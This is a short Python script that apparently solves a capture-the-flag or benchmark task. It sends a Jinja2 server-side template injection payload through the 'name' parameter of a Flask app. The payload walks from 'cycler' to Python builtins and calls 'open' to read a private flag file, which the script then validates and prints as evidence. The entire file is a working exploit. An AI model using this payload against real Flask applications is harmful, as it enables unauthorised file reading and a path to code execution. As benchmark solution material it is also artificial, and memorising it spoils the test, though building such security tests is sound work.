#!/usr/bin/env python3
"""Read the injected private file through the Flask template sink."""

import json
import os
import urllib.parse
import urllib.request


FLAG_PATH = "/app/private/flask-001-secret"


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    expression = (
        '{{cycler.__init__.__globals__["__builtins__"]["open"]('
        + json.dumps(FLAG_PATH)
        + ').read()}}'
    )
    url = target_url.rstrip("/") + "/?" + urllib.parse.urlencode({"name": expression})
    with urllib.request.urlopen(url, timeout=20) as response:
        body = response.read().decode("utf-8")
    if not body.startswith("Hello "):
        raise RuntimeError("Unexpected template response")
    content = body[len("Hello "):]
    if not content.startswith("jaylbreak.win{") or not content.endswith("}"):
        raise RuntimeError("Private file value was not returned")
    print(json.dumps({"evidence_payload": {"flag_path": FLAG_PATH, "content": content}}))


if __name__ == "__main__":
    main()
